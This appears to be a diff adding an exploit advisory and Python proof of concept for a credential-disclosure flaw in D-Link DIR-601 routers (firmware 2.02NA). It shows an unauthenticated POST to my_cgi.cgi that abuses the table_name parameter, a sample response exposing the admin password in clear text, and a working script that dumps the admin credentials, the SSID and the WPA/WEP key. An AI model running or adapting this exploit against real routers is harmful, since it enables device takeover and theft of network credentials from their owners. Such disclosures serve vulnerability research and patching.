@@ -1,0 +1,121 @@
+# Exploit title: D-Link DIR601 2.02NA - Credential disclosure
+# Date: 2018-07-10
+# Exploit Author: Richard Rogerson
+# Vendor Homepage: http://ca.dlink.com/
+# Software Link: http://support.dlink.ca/ProductInfo.aspx?m=DIR-601
+# Version: <= 2.02NA
+# Tested on: D-Link DIR601 Firmware 2.02NA
+# Contact: http://twitter.com/pktlabs
+# Website: https://www.packetlabs.net
+# CVE: N/A 
+# Category: Webapps, Remote
+
+
+# 1. Description:
+# Through analyzing the Captcha function implemented in the DIR-601 (2.02NA firmware), 
+# a HTTP request was found responsible for the handoff to client-side code. 
+# Inspecting the HTTP requests, it was identified that a parameter named ‘table_name’ 
+# is used to instruct the back-end application which content to return. By abusing this
+# request, it was found possible to retrieve sensitive information relating to the device
+# configuration and administrative credentials.
+
+# It is possible to modify the HTTP POST to my_cgi.cgi and include as table_name references
+# to retrieve the administrative credentials, wireless ssid, and pre-shared key where 
+# applicable. Enumerating the naming conventions within the client-side code, it was
+# determined that a number of potentially sensitive parameters/tables exist in the
+# back-end environment which provide significant value if retrieved, four of these include:
+
+# -	Admin_user
+# -	Wireless_settings
+# -	Wireless_security
+# -	Wireless_wpa_settings
+
+Sample of the vulnerable POST request:
+
+HTTP Request
+POST /my_cgi.cgi HTTP/1.1
+Host: 192.168.0.1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://192.168.0.1/login_real.htm
+Content-Length: 86
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+
+request=no_auth&request=load_settings&table_name=create_auth_pic&table_name=admin_user <- additional table requested
+
+Sample response:
+
+HTTP Response
+HTTP/1.1 200 OK
+Content-type: text/xml
+Connection: close
+Date: Sat, 01 Jan 2011 00:57:12 GMT
+Server: lighttpd/1.4.28
+Content-Length: 228
+
+<?xml version="1.0"?><root><login_level>1</login_level><show_authid>50649</show_authid><admin_user><admin_user_name>admin</admin_user_name><admin_user_pwd>clear-text-password</admin_user_pwd><admin_level>1</admin_level></admin_user></root>
+
+
+# 2. Exploit Code:
+
+#!/usr/bin/python
+import socket,sys,urllib,urllib2
+import xml.etree.ElementTree as ET
+
+print """Packetlabs
+====================================
+D-Link DIR-601 Authorization Bypass
+"""
+if len(sys.argv) != 2:
+	print "usage:",sys.argv[0],"<ipaddr>"
+	sys.exit()
+else:
+    ipaddr=sys.argv[1]
+    print "Retrieving admin username, password and wireless security configuration from",ipaddr
+
+# build URL
+url = 'http://'
+url+= ipaddr
+url+='/my_cgi.cgi'
+data = "request=no_auth&request=load_settings&table_name=admin_user&table_name=user_user&table_name=wireless_settings&table_name=wireless_security&table_name=wireless_wpa_settings"
+
+# send payload
+req = urllib2.Request(url, data)
+response = urllib2.urlopen(req)
+print "Sending payload to:",response.geturl()
+retr = response.read()
+root = ET.fromstring(retr)
+
+# credential dump
+print "\r\nAdmin Creds"
+print "username:",root[0][0].text
+print "password:",root[0][1].text
+
+# dump wireless settings
+print "\r\nWireless Settings"
+sectype=int(root[3][0].text)
+ssid=root[2][2].text
+enctype="none"
+
+print "SSID is:", ssid
+if sectype == 2:
+	enctype="WPA2"
+	key=root[4][3].text
+elif sectype == 1:
+	enctype="WEP("
+	keylength=int(root[3][3].text)
+	if keylength == 5:
+            enctype+="64bit)"
+	    key=root[3][5].text
+	elif keylength == 13:
+            enctype+="128bit)"
+	    key=root[3][9].text
+	else:
+	    key="Error, please inspect xml manually above, keylength=",keylength
+            print retr
+elif sectype == 0:
+	print "Wireless network is open?"
+	sys.exit()
+
+print enctype,"key is:",key
